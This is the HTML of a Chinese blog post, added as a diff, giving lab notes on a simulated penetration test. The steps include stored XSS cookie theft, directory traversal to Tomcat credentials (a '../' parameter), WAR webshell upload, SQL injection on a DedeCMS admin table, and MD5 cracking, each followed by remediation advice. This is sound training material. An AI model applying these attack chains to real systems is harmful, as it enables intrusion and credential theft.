@@ -1,0 +1,2469 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <script type="application/javascript" src='http://localhost:1313/js/theme-mode.js'></script>
+    <link rel="stylesheet" href='http://localhost:1313/css/frameworks.min.css' />
+    <link rel="stylesheet" href='http://localhost:1313/css/github.min.css' />
+    <link rel="stylesheet" href='http://localhost:1313/css/github-style.css' />
+    <link rel="stylesheet" href='http://localhost:1313/css/light.css' />
+    <link rel="stylesheet" href='http://localhost:1313/css/dark.css' />
+    <link rel="stylesheet" href='http://localhost:1313/css/syntax.css' />
+    <title>【N0te】渗透测试实验 - L4place&#39;s blog</title>
+    
+    <link rel="icon" type="image/x-icon" href='/images/github-mark.png'>
+    
+    <meta name="theme-color" content="#1e2327">
+
+    
+    
+
+    
+    <meta name="description"
+  content="关于企业网渗透测试的一次实战（或许是），以及体验了实际的渗透测试报告是如何写的。实验全部依托于实验平台，虽然是模拟的网络拓扑结构，但是依旧具有一定参考价值。" />
+<meta name="keywords"
+  content='blog, google analytics' />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="http://localhost:1313/post/note/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C/" />
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="【N0te】渗透测试实验 - L4place&#39;s blog" />
+<meta name="twitter:description"
+  content="关于企业网渗透测试的一次实战（或许是），以及体验了实际的渗透测试报告是如何写的。实验全部依托于实验平台，虽然是模拟的网络拓扑结构，但是依旧具有一定参考价值。" />
+<meta name="twitter:site" content="http://localhost:1313/" />
+<meta name="twitter:creator" content="" />
+<meta name="twitter:image"
+  content="http://localhost:1313/">
+
+
+<meta property="og:type" content="article" />
+<meta property="og:title" content="【N0te】渗透测试实验 - L4place&#39;s blog">
+<meta property="og:description"
+  content="关于企业网渗透测试的一次实战（或许是），以及体验了实际的渗透测试报告是如何写的。实验全部依托于实验平台，虽然是模拟的网络拓扑结构，但是依旧具有一定参考价值。" />
+<meta property="og:url" content="http://localhost:1313/post/note/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C/" />
+<meta property="og:site_name" content="【N0te】渗透测试实验" />
+<meta property="og:image"
+  content="http://localhost:1313/">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+<meta property="article:published_time" content="2026-01-01 05:23:05 &#43;0800 CST" />
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+
+<body>
+  <div style="position: relative">
+  <header class="Header js-details-container Details px-3 px-md-4 px-lg-5 flex-wrap flex-md-nowrap open Details--on">
+    <div class="Header-item mobile-none" style="margin-top: -4px; margin-bottom: -4px;">
+      <a class="Header-link" href="http://localhost:1313/">
+        <img class="octicon" height="32" width="32" src="/images/github-mark-white.png">
+      </a>
+    </div>
+    <div class="Header-item d-md-none">
+      <button class="Header-link btn-link js-details-target" type="button"
+        onclick="document.querySelector('#header-search').style.display = document.querySelector('#header-search').style.display == 'none'? 'block': 'none'">
+        <svg height="24" class="octicon octicon-three-bars" viewBox="0 0 16 16" version="1.1" width="24">
+          <path fill-rule="evenodd" d="M1 2.75A.75.75 0 011.75 2h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 2.75zm0 5A.75.75 0 011.75 7h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 7.75zM1.75 12a.75.75 0 100 1.5h12.5a.75.75 0 100-1.5H1.75z">
+          </path>
+        </svg>
+      </button>
+    </div>
+    <div style="display: none;" id="header-search"
+      class="Header-item Header-item--full flex-column flex-md-row width-full flex-order-2 flex-md-order-none mr-0 mr-md-3 mt-3 mt-md-0 Details-content--hidden-not-important d-md-flex">
+      <div
+        class="Header-search header-search flex-auto js-site-search position-relative flex-self-stretch flex-md-self-auto mb-3 mb-md-0 mr-0 mr-md-3 scoped-search site-scoped-search js-jump-to">
+        <div class="position-relative">
+          
+          <form target="_blank" action="https://www.google.com/search" accept-charset="UTF-8" method="get"
+            autocomplete="off">
+            <label
+              class="Header-search-label form-control input-sm header-search-wrapper p-0 js-chromeless-input-container header-search-wrapper-jump-to position-relative d-flex flex-justify-between flex-items-center">
+              <input type="text"
+                class="Header-search-input form-control input-sm header-search-input jump-to-field js-jump-to-field js-site-search-focus js-site-search-field is-clearable"
+                name="q" value="" placeholder="Search" autocomplete="off">
+              <input type="hidden" name="q" value="site:http://localhost:1313/">
+            </label>
+          </form>
+          
+        </div>
+      </div>
+    </div>
+
+    <div class="Header-item Header-item--full flex-justify-center d-md-none position-relative">
+      <a class="Header-link " href="http://localhost:1313/">
+        <img class="octicon octicon-mark-github v-align-middle" height="32" width="32" src="/images/github-mark-white.png">
+      </a>
+    </div>
+    <div class="Header-item" style="margin-right: 0;">
+      <a href="javascript:void(0)" class="Header-link no-select" onclick="switchTheme()">
+        <svg style="fill: var(--color-profile-color-modes-toggle-moon);" class="no-select" viewBox="0 0 16 16"
+          version="1.1" width="16" height="16">
+          <path fill-rule="evenodd" clip-rule="evenodd"
+            d="M4.52208 7.71754C7.5782 7.71754 10.0557 5.24006 10.0557 2.18394C10.0557 1.93498 10.0392 1.68986 10.0074 1.44961C9.95801 1.07727 10.3495 0.771159 10.6474 0.99992C12.1153 2.12716 13.0615 3.89999 13.0615 5.89383C13.0615 9.29958 10.3006 12.0605 6.89485 12.0605C3.95334 12.0605 1.49286 10.001 0.876728 7.24527C0.794841 6.87902 1.23668 6.65289 1.55321 6.85451C2.41106 7.40095 3.4296 7.71754 4.52208 7.71754Z">
+          </path>
+        </svg>
+      </a>
+    </div>
+  </header>
+</div>
+
+  <div id="search-result" class="container-lg px-3 new-discussion-timeline" style="display: none;">
+</div>
+
+  
+<div class="application-main">
+  <div>
+  <main>
+    <div class="gisthead pagehead bg-gray-light pb-0 pt-3 mb-4">
+      <div class="px-0">
+        <div class="mb-3 d-flex px-3 px-md-3 px-lg-5">
+          <div class="flex-auto min-width-0 width-fit mr-3">
+            <div class="d-flex">
+              <div class="d-none d-md-block">
+                <a class="avatar mr-2 flex-shrink-0" href="http://localhost:1313/">
+                  <img class=" avatar-user"
+                    src="/images/avatar.png"
+                    width="32" height="32"></a>
+              </div>
+              <div class="d-flex flex-column">
+                <h1 class="break-word f3 text-normal mb-md-0 mb-1">
+                  <span class="author">
+                    <a href="http://localhost:1313/">L4place</a>
+                  </span>
+                  <span class="path-divider">/</span>
+                  <strong class="css-truncate css-truncate-target mr-1" style="max-width: 410px">
+                    <a href="http://localhost:1313/post/note/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C/">【N0te】渗透测试实验</a>
+                  </strong>
+                </h1>
+                <div class="note m-0">
+                  Created <relative-time datetime="Thu, 01 Jan 2026 05:23:05 &#43;0800"
+                    class="no-wrap">
+                    Thu, 01 Jan 2026 05:23:05 &#43;0800</relative-time>
+
+                  
+                  <span class="file-info-divider"></span>
+                  Modified <relative-time datetime="Thu, 01 Jan 2026 05:49:21 &#43;0800"
+                    class="no-wrap">
+                    Thu, 01 Jan 2026 05:49:21 &#43;0800</relative-time>
+                  
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="container-lg px-3 new-discussion-timeline">
+      <div class="repository-content gist-content">
+        <div>
+          <div class="js-gist-file-update-container js-task-list-container file-box">
+            <div id="file-pytest" class="file my-2">
+              <div id="post-header" class="file-header d-flex flex-md-items-center flex-items-start sticky-header" style="z-index: 2">
+                <div class="file-info d-flex flex-md-items-center flex-items-start flex-order-1 flex-auto">
+                  <div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0">
+                    
+                    <summary id="toc-toggle" onclick="clickToc()" class="btn btn-octicon m-0 mr-2 p-2">
+                      <svg aria-hidden="true" viewBox="0 0 16 16" height="16" width="16" class="octicon octicon-list-unordered">
+                        <path fill-rule="evenodd" d="M2 4a1 1 0 100-2 1 1 0 000 2zm3.75-1.5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zM3 8a1 1 0 11-2 0 1 1 0 012 0zm-1 6a1 1 0 100-2 1 1 0 000 2z"></path>
+                      </svg>
+                    </summary>
+                    <details-menu class="SelectMenu" id="toc-details" style="display: none;">
+                      <div class="SelectMenu-modal rounded-3 mt-1" style="max-height: 340px;">
+                        <div class="SelectMenu-list SelectMenu-list--borderless p-2" style="overscroll-behavior: contain;" id="toc-list">
+                        </div>
+                      </div>
+                    </details-menu>
+                      22772 Words
+                    
+
+                  </div>
+                  <div class="file-actions flex-order-2 pt-0">
+                    
+                    
+                    <a class="muted-link mr-3" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8">
+                      <svg class="octicon octicon-tag" viewBox="0 0 16 16" version="1.1" width="16" height="16">
+                        <path fill-rule="evenodd"
+                          d="M2.5 7.775V2.75a.25.25 0 01.25-.25h5.025a.25.25 0 01.177.073l6.25 6.25a.25.25 0 010 .354l-5.025 5.025a.25.25 0 01-.354 0l-6.25-6.25a.25.25 0 01-.073-.177zm-1.5 0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 010 2.474l-5.026 5.026a1.75 1.75 0 01-2.474 0l-6.25-6.25A1.75 1.75 0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z">
+                        </path>
+                      </svg>
+                      网络安全
+                    </a>
+                    
+                    <a class="muted-link mr-3" href="/tags/%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0">
+                      <svg class="octicon octicon-tag" viewBox="0 0 16 16" version="1.1" width="16" height="16">
+                        <path fill-rule="evenodd"
+                          d="M2.5 7.775V2.75a.25.25 0 01.25-.25h5.025a.25.25 0 01.177.073l6.25 6.25a.25.25 0 010 .354l-5.025 5.025a.25.25 0 01-.354 0l-6.25-6.25a.25.25 0 01-.073-.177zm-1.5 0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 010 2.474l-5.026 5.026a1.75 1.75 0 01-2.474 0l-6.25-6.25A1.75 1.75 0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z">
+                        </path>
+                      </svg>
+                      实验笔记
+                    </a>
+                    
+                    
+                  </div>
+                </div>
+              </div>
+
+
+              <div class="Box-body px-5 pb-5" style="z-index: 1">
+                <article class="markdown-body entry-content container-lg"><h1 id="1-实验一">1. 实验一</h1>
+<h2 id="问题一">问题一</h2>
+<h3 id="渗透流程">渗透流程</h3>
+<p>&lt;XSS(跨站脚本攻击)&gt;</p>
+<ol>
+<li>
+<p>思路梳理：
+发现网站新闻页有评论框 - 可能的 XSS 漏洞利用，
+通过构造 XSS Payload 验证，确认站点存在 存储型XSS 漏洞。
+存储型XSS 攻击思路 -&gt; 获取后台 管理员Cookie 达成 无账号登录管理后台
+在本机搭建简易服务器，获取 XSS 返回的 Cookie<img src="02ee454fa000e62e0571caab6dc6a9cd_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>漏洞利用：
+获取 管理员Cookie 之后，可以绕过登录验证登录管理后台
+使用Burpsuite抓包，修改登录时的请求包，将请求包的 Cookie 替换为 管理员Cookie。</p>
+</li>
+<li>
+<p>夺旗：flag1{498cc55df0c7a39c} 就在管理系统后台的【用户管理】菜单的管理员的用户描述中。<img src="d828012dc09f326ccb68b7c822fea712_MD5.webp" alt=""></p>
+</li>
+</ol>
+<h3 id="漏洞链条分析"><strong>漏洞链条分析</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>阶段</th>
+          <th>技术要点</th>
+          <th>说明</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>输入点发现</td>
+          <td>评论框存在存储型 XSS 漏洞</td>
+          <td>攻击者在新闻页评论框注入恶意脚本，脚本被后台记录并反射给其他用户。</td>
+      </tr>
+      <tr>
+          <td>Payload 触发</td>
+          <td>管理员访问被注入页面</td>
+          <td>注入的 XSS Payload 被后台管理员浏览器执行，发送其 Cookie 到攻击者搭建的服务端。</td>
+      </tr>
+      <tr>
+          <td>Cookie 获取</td>
+          <td>搭建监听服务</td>
+          <td>攻击者监听恶意脚本回传的数据，捕获管理员 Cookie。</td>
+      </tr>
+      <tr>
+          <td>权限劫持</td>
+          <td>使用管理员 Cookie 登录</td>
+          <td>利用 BurpSuite 替换请求包中的 Cookie，实现无需密码直接登录后台。</td>
+      </tr>
+      <tr>
+          <td>信息窃取</td>
+          <td>后台获取 flag1</td>
+          <td>成功访问【用户管理】页面，读取隐藏的 flag 信息。</td>
+      </tr>
+      <tr>
+          <td></td>
+          <td></td>
+          <td></td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="修复建议"><strong>修复建议</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>漏洞类型</th>
+          <th>防御措施</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>存储型 XSS</td>
+          <td>1. 前后端统一对用户输入进行严格 HTML/JS 编码处理（如使用 <code>OWASP ESAPI</code>）。2. 针对评论、表单等可输入位置使用白名单过滤机制，禁止注入脚本内容。</td>
+      </tr>
+      <tr>
+          <td>Cookie 窃取</td>
+          <td>1. 设置 Cookie 的 <code>HttpOnly</code> 属性，防止通过 JS 获取。2. 启用 CSRF Token 验证，限制非法请求冒充用户身份发起操作。</td>
+      </tr>
+      <tr>
+          <td>会话劫持</td>
+          <td>1. 为敏感操作加入验证码或行为验证，防止重放攻击。2. 设置会话失效机制（如短生命周期 + IP绑定策略）。</td>
+      </tr>
+      <tr>
+          <td>前端输出缺陷</td>
+          <td>1. 所有动态内容在渲染前进行 <code>escape</code> 处理，避免原样输出脚本。2. 使用安全的前端模板引擎，自动处理插值编码。</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="总结"><strong>总结</strong></h3>
+<p>本次攻击通过在评论框注入 XSS Payload，利用管理员访问行为执行恶意脚本，进而获取其 Cookie 并实现后台权限劫持。该攻击体现了典型的<strong>存储型 XSS 攻击链条</strong>，一旦成功可完全绕过身份验证系统，直接进入后台并提取敏感信息（如 flag）。</p>
+<p>防护重点应放在：输入验证与输出编码、Cookie 安全属性设置、以及后台认证机制的强化。通过“前端输入检查 + 后端严格过滤 + 安全会话管理”的多层策略，可有效阻断此类攻击路径。</p>
+<h2 id="问题二">问题二</h2>
+<h3 id="渗透流程-1">渗透流程</h3>
+<p>&lt;目录穿越漏洞&gt;</p>
+<ol>
+<li>
+<p>信息收集：
+通过管理后台特征和搜索引擎，获知该CMS为“OFCMS”，
+在网上搜集代码审计文章，发现该CMS存在目录遍历漏洞。</p>
+</li>
+<li>
+<p>漏洞利用：
+利用 Burpsuite 抓包，抓切换目录的包，然后发起重放攻击，
+并对 dir参数 利用 <code>../</code> 进行目录穿越测试。
+发现存在，并继续穿透，直到发现 Tomcat目录 ，找到conf/tomcat-users.xml，
+就可以获取 tomcat 的账号密码。<img src="15b2285b80d1b590ca65a5ad3577a73d_MD5.webp" alt=""><img src="0ed396f6c71bf29340d8e8b440350566_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>夺旗：flag2
+访问<code>http://www.qianxin.com/manager/html</code> 然后输入账号密码，flag2{1595a7d9910930ca} 就在里面。
+<img src="3c6a5433c9dea40ec20cbfaa2a71c0f1_MD5.webp" alt=""></p>
+</li>
+</ol>
+<h3 id="漏洞链条分析-1"><strong>漏洞链条分析</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>阶段</th>
+          <th>技术要点</th>
+          <th>说明</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>信息收集</td>
+          <td>确定后台为 OFCMS</td>
+          <td>搜索引擎 + 页面特征识别后台类型，挖掘已知漏洞资源。</td>
+      </tr>
+      <tr>
+          <td>参数注入</td>
+          <td>构造路径穿越 Payload</td>
+          <td>修改 <code>dir=../../...</code> 参数，尝试向上穿越至敏感目录。</td>
+      </tr>
+      <tr>
+          <td>敏感信息获取</td>
+          <td>读取 tomcat-users.xml</td>
+          <td>成功访问 <code>/conf/tomcat-users.xml</code>，获取管理口令。</td>
+      </tr>
+      <tr>
+          <td>权限获取</td>
+          <td>登录管理控制台</td>
+          <td>使用口令登录 Tomcat 管理页面，读取 flag2 内容。</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="修复建议-1"><strong>修复建议</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>漏洞类型</th>
+          <th>防御措施</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>目录遍历漏洞</td>
+          <td>1. 后端对文件路径参数进行 <strong>严格白名单校验</strong>，拒绝包含 <code>../</code> 等非法路径的请求。2. 禁止前端传入目录路径，使用服务端路径映射机制处理资源访问。</td>
+      </tr>
+      <tr>
+          <td>Web 配置泄露</td>
+          <td>1. 将 <code>conf</code>、<code>WEB-INF</code> 等目录设为不可被 Web 访问。2. 使用 Web 容器（如 Tomcat）配置访问控制规则，屏蔽管理文件夹对外访问权限。</td>
+      </tr>
+      <tr>
+          <td>系统默认配置风险</td>
+          <td>1. 修改 Tomcat 默认管理页面路径和默认账户名。2. 管理口令使用强密码，并通过访问控制、VPN、白名单等机制限制访问范围。</td>
+      </tr>
+      <tr>
+          <td>第三方组件漏洞</td>
+          <td>1. 关注 CMS 等第三方组件安全公告，定期更新版本。2. 对公开系统定期做漏洞扫描和配置审计。</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="总结-1"><strong>总结</strong></h3>
+<p>该攻击链充分体现了目录遍历漏洞的危害性——一旦攻击者能够成功穿透路径结构访问系统配置文件，便可能轻松获取远程控制权限。攻击过程中无需凭证，仅依赖对参数控制和公开资源的了解即可完成权限获取与数据提取。</p>
+<p>企业在部署 Web 系统时，务必对第三方组件进行审计与加固，尤其是限制任意目录参数传入，避免敏感配置文件对外暴露，并结合访问控制、最小权限与日志监控等机制提升整体安全性。</p>
+<h2 id="问题三">问题三</h2>
+<h3 id="渗透流程-2">渗透流程</h3>
+<p>&lt;文件上传漏洞&gt;</p>
+<ol>
+<li>
+<p>思路梳理：
+上一个任务点已经成功登录了 tomcat 的管理界面，
+通过此界面可以上传jsp木马，然后getShell，不过在 tomcat 管理界面无法直接上传jsp文件，需要先打包成war文件。</p>
+</li>
+<li>
+<p>getShell：
+通过 tomcat 管理界面植入打包成war的 webShell，并用远程工具连接即可，
+这里的工具选择 CKnife。
+使用 Cknife 连接<code>http://www.qianxin.com/webshell/webshell.jsp</code>，
+输入密码“Cknife”即可连上。</p>
+</li>
+<li>
+<p>夺旗：flag3
+登录网站之后，flag3{e0c34f72c42d6b90} 就在目录中。
+<img src="3c57ac3d3d1b9b257113c002d9e22572_MD5.webp" alt=""></p>
+</li>
+</ol>
+<h3 id="漏洞链条分析-2"><strong>漏洞链条分析</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>阶段</th>
+          <th>技术要点</th>
+          <th>说明</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>初始控制</td>
+          <td>登录 Tomcat 管理界面</td>
+          <td>基于上一问题中通过目录遍历获取的账户密码成功登录管理后台。</td>
+      </tr>
+      <tr>
+          <td>利用上传功能</td>
+          <td>上传恶意 WAR 包</td>
+          <td>使用 JSP WebShell 打包成 WAR 包，通过 Tomcat 的 Web 应用部署功能上传。</td>
+      </tr>
+      <tr>
+          <td>命令执行</td>
+          <td>远程连接 WebShell</td>
+          <td>使用 CKnife 等工具访问并连接 <code>webshell.jsp</code> 页面，实现远程命令执行。</td>
+      </tr>
+      <tr>
+          <td>权限利用</td>
+          <td>系统访问和文件操作</td>
+          <td>成功执行命令后，定位到 Web 目录下的 flag 文件并读取内容。</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="修复建议-2"><strong>修复建议</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>漏洞类型</th>
+          <th>防御措施</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>WebShell 上传风险</td>
+          <td>1. 禁止通过 Web 管理界面部署未经签名的 WAR 包。2. 使用安全加固的管理策略，关闭远程上传部署功能，或设置独立认证机制。</td>
+      </tr>
+      <tr>
+          <td>JSP 脚本执行</td>
+          <td>1. 禁止生产环境中部署 JSP 执行环境或禁用脚本执行功能。2. 使用 WAF 过滤上传文件类型和访问路径。</td>
+      </tr>
+      <tr>
+          <td>上传验证缺失</td>
+          <td>1. 对上传文件进行后缀、MIME 类型、内容等多重校验。2. 上传内容存储于非 Web 目录，避免直接访问。</td>
+      </tr>
+      <tr>
+          <td>管理后台配置风险</td>
+          <td>1. Tomcat 管理页面仅对内网开放，或设置 IP 白名单。2. 强化后台认证机制，例如双因素认证（2FA）或单点登录系统（SSO）。</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="总结-2"><strong>总结</strong></h3>
+<p>本次攻击基于前期已获取的 Tomcat 管理权限，通过上传打包的 WebShell 获取远程控制权，属于典型的<strong>持久化控制阶段攻击</strong>。如果缺乏必要的部署验证和文件访问限制，攻击者可以持续操控服务器、植入后门，甚至横向移动到其他系统。</p>
+<p>防范此类攻击的关键在于<strong>严格限制管理功能使用范围</strong>，<strong>强化上传验证机制</strong>，并通过 <strong>入侵检测、防火墙与安全审计系统</strong> 构建纵深防御体系，从而有效应对 WebShell 类威胁。</p>
+<hr>
+<h1 id="2-实验二">2. 实验二</h1>
+<h2 id="问题四">问题四</h2>
+<h3 id="渗透流程-3">渗透流程</h3>
+<p>&lt;sql注入漏洞&gt;</p>
+<ol>
+<li>
+<p>思路整理：
+从页面很多地方可以看出该CMS是一个开源CMS，有时候开发者会魔改开源项目，
+但是仍然有可能有一些漏洞会留下并被利用。</p>
+</li>
+<li>
+<p>利用 wwwscan工具 对网站目录进行收集
+在发现了目录之后，需要逐个分析、去验证哪个目录可能存在漏洞，
+在本项目中，发现 sql文件夹 有异常返回结果。
+判断存在 sql注入漏洞。
+<img src="47c6f9dbd1493f3882fe2471968da6ff_MD5.webp" alt=""><img src="7de28bba480e069202c4c25b1ce7b007_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>漏洞利用：sql注入漏洞
+因为存在 sql注入漏洞，我们可以通过不断尝试，获取数据库信息。
+通过精心构造的 url，可以获取 数据库 中 dede_damin表 信息。
+![](Pasted image 20250417104720.webp)</p>
+</li>
+<li>
+<p>夺旗：
+flag4{c261a93b636d1975} 就在dede_admin表中。
+<img src="dcbacdabb0b2e00bcc00ae471cbde301_MD5.webp" alt=""></p>
+</li>
+</ol>
+<h3 id="漏洞链条分析-3"><strong>漏洞链条分析</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>阶段</th>
+          <th>技术要点</th>
+          <th>说明</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>信息收集</td>
+          <td>使用扫描器识别目录结构</td>
+          <td>借助工具（如 <code>wwwscan</code>）扫描得到 <code>/sql/</code> 相关敏感目录。</td>
+      </tr>
+      <tr>
+          <td>确认注入点</td>
+          <td>目录返回值异常</td>
+          <td>通过观察响应行为异常的页面，判断存在可注入的参数接口。</td>
+      </tr>
+      <tr>
+          <td>注入利用</td>
+          <td>构造 Payload 获取数据库结构</td>
+          <td>构造联合查询等注入语句，提取 <code>dede_admin</code> 等敏感表信息。</td>
+      </tr>
+      <tr>
+          <td>数据提取</td>
+          <td>提取用户名与密码字段</td>
+          <td>成功读取含 flag 内容的管理员表字段，完成数据窃取。</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="修复建议-3"><strong>修复建议</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>漏洞类型</th>
+          <th>防御措施</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>SQL 注入</td>
+          <td>1. 使用 ORM 框架或预编译语句（如 <code>PreparedStatement</code>）防止注入。2. 对用户输入严格过滤，禁止传入非法字符（如 <code>'</code>, <code>--</code>, <code>;</code>）。</td>
+      </tr>
+      <tr>
+          <td>异常目录暴露</td>
+          <td>1. 删除未使用的测试接口与调试路径。2. 使用 Web 应用防火墙（WAF）过滤敏感路径访问行为。</td>
+      </tr>
+      <tr>
+          <td>数据库信息泄露</td>
+          <td>1. 限制 Web 服务访问数据库权限，仅开放必要字段与操作。2. 开启数据库访问审计与敏感信息加密。</td>
+      </tr>
+      <tr>
+          <td>开源系统魔改风险</td>
+          <td>1. 定期关注所用 CMS 框架漏洞通告，及时打补丁。2. 对第三方插件与组件进行代码审计和权限隔离。</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="总结-3"><strong>总结</strong></h3>
+<p>本次攻击基于典型的 <strong>开源 CMS 残留 SQL 注入漏洞</strong>，攻击者通过扫描工具识别目录结构后，精确定位漏洞点并成功提取了数据库敏感信息，最终读取到包含 flag 的字段。</p>
+<p>此类攻击表明，即使系统表面经过改造，只要底层代码逻辑存在疏漏，仍难逃被注入攻击。企业应重点关注 <strong>代码层防护</strong> 与 <strong>数据库最小权限配置</strong>，结合 <strong>安全扫描</strong> 和 <strong>WAF 防护</strong> 实现注入攻击的有效拦截。</p>
+<h2 id="问题五">问题五</h2>
+<h3 id="渗透流程-4">渗透流程</h3>
+<p>&lt;未授权访问&gt; + &lt;弱口令破解&gt;
+在获取flag4的过程中，我们已经获知了 dede_admin表 的内容，
+也就是说我们已经拿到了管理员账号密码信息。
+但是我们只能拿到加密后的密码，
+通过互联网，可以查询到dedecms的加密算法，
+以此，可以通过其他方法破解MD5值。</p>
+<ol>
+<li>
+<p>利用 MD5Crack V3.4工具 破解密码
+将处理后的MD5值输入到工具的【破解单个密文】的输入框中，
+然后选择“list.txt”字典进行爆破。
+<img src="63a0b1ce3f320095837f1adeaa9bea60_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>登录后台：
+访问<code>http://news.qianxin.com/manager/login.php</code>,并使用爆破出的密码登录管理员账户，成功登录后台。<img src="2579b3cae357bfc6558b125263cd700e_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>夺旗：
+flag5{b9719d911017c592} 就在登陆后的后台页面中。
+<img src="1bfbd3ccccfbc4405158075221ec70de_MD5.webp" alt=""></p>
+</li>
+</ol>
+<h3 id="漏洞链条分析-4">漏洞链条分析</h3>
+<table>
+  <thead>
+      <tr>
+          <th>阶段</th>
+          <th>所用技术 / 行为</th>
+          <th>所属漏洞类型</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>获取 <code>dede_admin</code></td>
+          <td>SQL注入 / 信息泄露 / 配置不当</td>
+          <td>信息泄露漏洞（Information Disclosure）</td>
+      </tr>
+      <tr>
+          <td>MD5 破解</td>
+          <td>利用工具或字典爆破 MD5 密码</td>
+          <td>密码学漏洞（弱加密）</td>
+      </tr>
+      <tr>
+          <td>后台登录</td>
+          <td>使用破解出的凭据登录</td>
+          <td>身份认证绕过 / 密码猜测攻击</td>
+      </tr>
+      <tr>
+          <td>夺取 flag5</td>
+          <td>后台缺乏授权控制 / 敏感信息展示过于直白</td>
+          <td>水平越权 / 后台信息泄露</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="修复建议-4">修复建议</h3>
+<ul>
+<li>使用强哈希算法（如 bcrypt、scrypt、argon2）替代 MD5</li>
+<li>后台增加验证码、IP 限制、二次认证</li>
+<li>对管理员密码强制复杂度要求，防止弱口令</li>
+<li>限制后台目录访问、加白名单、移除 flag 等敏感信息展示</li>
+<li>定期扫描敏感信息泄露，限制 SQL 接口权限</li>
+</ul>
+<h3 id="总结-4">总结</h3>
+<p><strong>这个 getshell + 登录后台的流程，本质上是一个典型的攻击链，涉及多个层级漏洞，其中核心是</strong>：</p>
+<ul>
+<li><strong>信息泄露</strong>（dede_admin 表）</li>
+<li><strong>弱加密破解</strong>（MD5 密码爆破）</li>
+<li><strong>后台认证绕过</strong></li>
+<li><strong>后台权限控制不严</strong></li>
+</ul>
+<p>整个链条中，<strong>每个环节都没有被加固或监控，导致最终攻击者成功登录并夺取 flag</strong>。</p>
+<h2 id="问题六">问题六</h2>
+<h3 id="渗透流程-5">渗透流程</h3>
+<p>&lt;任意读取文件漏洞&gt;
+在flag5任务点中，我们已经登录了dedecms后台。
+通过分析，我们可以获知：“dede数据库配置文件所在路径为：/data/common.ini.php”。</p>
+<ol>
+<li>
+<p>漏洞利用
+在CMS中有文件管理器，其中我们可以直接查阅文件信息，
+我们在根目录中可以看到data文件夹，点击进入，
+可以看到我们需要的common.ini.php文件。</p>
+</li>
+<li>
+<p>夺旗：
+编辑 common.ini.php文件，可以查看文件内容，
+在该文件内容中可以发现 flag6{dd9e7b0c1a6227a2}。
+<img src="f27de5aa5d41f9a7d86090c8ecdc6b0f_MD5.webp" alt=""></p>
+</li>
+</ol>
+<h3 id="漏洞链条分析-5">漏洞链条分析</h3>
+<table>
+  <thead>
+      <tr>
+          <th>阶段</th>
+          <th>行为</th>
+          <th>所属漏洞类型</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>登录后台</td>
+          <td>合理权限（但是通过攻击获取）</td>
+          <td>身份认证绕过（前置链）</td>
+      </tr>
+      <tr>
+          <td>使用文件管理器读取配置文件</td>
+          <td>功能授权过宽 / 后台功能滥用</td>
+          <td>垂直越权 / 设计缺陷</td>
+      </tr>
+      <tr>
+          <td>查看明文配置并获取 flag6</td>
+          <td>配置明文包含敏感信息</td>
+          <td>信息泄露（Sensitive Info Disclosure）</td>
+      </tr>
+  </tbody>
